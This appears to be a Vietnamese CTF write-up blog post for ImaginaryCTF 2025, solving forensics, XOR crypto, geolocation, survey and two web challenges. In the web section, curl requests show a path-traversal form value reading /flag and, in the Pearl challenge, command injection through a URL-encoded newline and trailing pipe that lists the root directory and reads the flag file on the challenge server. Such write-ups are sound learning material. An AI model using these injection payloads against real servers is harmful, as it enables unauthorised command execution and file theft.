---
title: ImaginaryCTF 2025
date: 2025-09-07 09:00:00 +0700
categories: [Security, CTF]
tags: [writeup, steganography, osint, crypto, web-security, python, forensics]
---

## Forensics

### Wave 
- **Tác giả:** Eth007
- **Mô tả:**  
not a steg challenge i promise
- **Attachment:** `wave.wav`
- **Cách giải:**

Tôi thử dùng exiftool để kiểm tra file `wave.wav` thì ở mục comment xuất hiện flag

![](/assets/img/imaginaryCTF2025/wave.png)  

- **Flag:** `ictf{obligatory_metadata_challenge}`

## Crypto

### redacted

- **Tác giả:** Eth007
- **Mô tả:**  
wait, i thought XORing something with itself gives all 0s???
- **Attachment:** 
- **Cách giải:**

Với việc để bài sử dụng **CyberChef** thì tôi nghĩ hướng giải sẽ liên quan tới việc dò plaintext. Do đó tôi có thử code một chút để việc dò và đoán dễ hơn một chút

Cùng với gợi ý là "XORing", tôi nghĩ sẽ liên quan đến XOR

```python
ciphertext_hex = "65 6c ce 6b c1 75 61 7e 53 66 c9 52 d8 6c 6a 53 6e 6e de 52 df 63 6d 7e 75 7f ce 64 d5 63 73"

known_plaintext = "ictf{xor"

try:
    ciphertext_bytes = [int(b, 16) for b in ciphertext_hex.split()]
    plaintext_bytes = [ord(c) for c in known_plaintext]
except ValueError:
    print("Error: The ciphertext_hex string contains non-hexadecimal characters.")
    exit()

key = []
for i in range(len(plaintext_bytes)):
    key_byte = plaintext_bytes[i] ^ ciphertext_bytes[i]
    key.append(key_byte)


decrypted_message_bytes = []
key_length = len(key)
if key_length == 0:
    print("Error: Cannot decrypt with an empty key. Is known_plaintext empty?")
    exit()

for i in range(len(ciphertext_bytes)):
    decrypted_byte = ciphertext_bytes[i] ^ key[i % key_length]
    decrypted_message_bytes.append(decrypted_byte)

decrypted_message = "".join(chr(b) for b in decrypted_message_bytes)

key_hex_str = "".join(f"{b:02x}" for b in key)
print(f"Known Plaintext: {known_plaintext}")
print(f"Recovered Key (Hex): {key_hex_str}")
print("-" * 30)
print(f"Decrypted Message: {decrypted_message}")
```

Kết quả trả về:  

![](/assets/img/imaginaryCTF2025/redacted.png)  

- **Flag:** `ictf{xor_is_bad_bad_encryption}`

## Misc

### Zoom 

- **Tác giả:**
- **Mô tả:**  
Where in the world is the red dot?
- **Attachment:** 
- **Cách giải:**

![](/assets/img/imaginaryCTF2025/zoom.png)  

- **Flag:** `ictf{45.282,-75.795}`

### Survey

- **Tác giả:**
- **Mô tả:**  
Give us feedback for the CTF here! Thanks so much for playing!
- **Attachment:** 
- **Cách giải:**

![](/assets/img/imaginaryCTF2025/survey-1.png)  

![](/assets/img/imaginaryCTF2025/survey-2.png)

- **Flag:** `ictf{thanks_for_playing_imaginaryctf_2025!}`

## Webs

### Codenames-1 

- **Tác giả:** Eth007
- **Mô tả:**  
I hear that multilingual codenames is all the rage these days. Flag is in /flag.txt.
- **Attachment:**  source code but i forgot the attachment's name
- **Cách giải:**

```bash
curl 'http://34.72.72.63:36188/create_game' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=eyJpc19ib3QiOmZhbHNlLCJ1c2VybmFtZSI6ImFiY3h5ekBnbWFpbC5jb20ifQ.aLvx_A.AnOmoNZXXPzVtW1JH7uqAZ6C4fA' \
  -H 'Origin: http://34.72.72.63:36188' \
  -H 'Referer: http://34.72.72.63:36188/lobby' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36' \
  --data-raw 'language=/flag&hard_mode=1' \
  --insecure
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/game/I91G4V">/game/I91G4V</a>. If not, click the link.
```

![](/assets/img/imaginaryCTF2025/codenames.png)

- **Flag:** `ictf{common_os_path_join_L_b19d35ca}`

### Pearl

- **Tác giả:** Eth007
- **Mô tả:**  
I used perl to make my pearl shop. Soon, we will expand to selling Perler bead renditions of Perlin noise.
- **Attachment:**  `pearl.zip`
- **Cách giải:**  

```bash
quanvo0112@KillV:~/CTF-Learning/imaginaryctf/Webs/pearl$ curl "http://pearl.chal.imaginaryctf.org/a%0als%20/|"
app
bin
boot
dev
etc
flag-8ede8d4419fba13690098d0df565f495.txt
home
kctf
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Tôi thấy được file `flag-8ede8d4419fba13690098d0df565f495.txt`  

```bash
quanvo0112@KillV:~/CTF-Learning/imaginaryctf/Webs/pearl$ curl "http://pearl.chal.imaginaryctf.org/a%0acat%20/flag-8ede8d4419fba13690098d0df565f495.txt|"
ictf{uggh_why_do_people_use_perl_1f023b129a22}
```

- **Flag:** `ictf{uggh_why_do_people_use_perl_1f023b129a22}`




